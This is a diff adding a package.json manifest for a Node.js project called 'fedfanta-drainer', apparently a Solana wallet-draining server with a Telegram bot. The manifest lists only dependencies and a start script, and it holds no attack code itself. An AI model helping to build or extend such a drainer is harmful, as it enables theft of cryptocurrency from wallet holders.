@@ -1,0 +1,18 @@
+{
+  "name": "fedfanta-drainer",
+  "version": "1.0.0",
+  "description": "FedFanta Drainer — server + bot",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "dependencies": {
+    "@solana/web3.js": "^1.95.0",
+    "axios": "^1.6.0",
+    "express": "^4.18.2",
+    "node-telegram-bot-api": "^0.64.0"
+  },
+  "engines": {
+    "node": "18.x"
+  }
+}
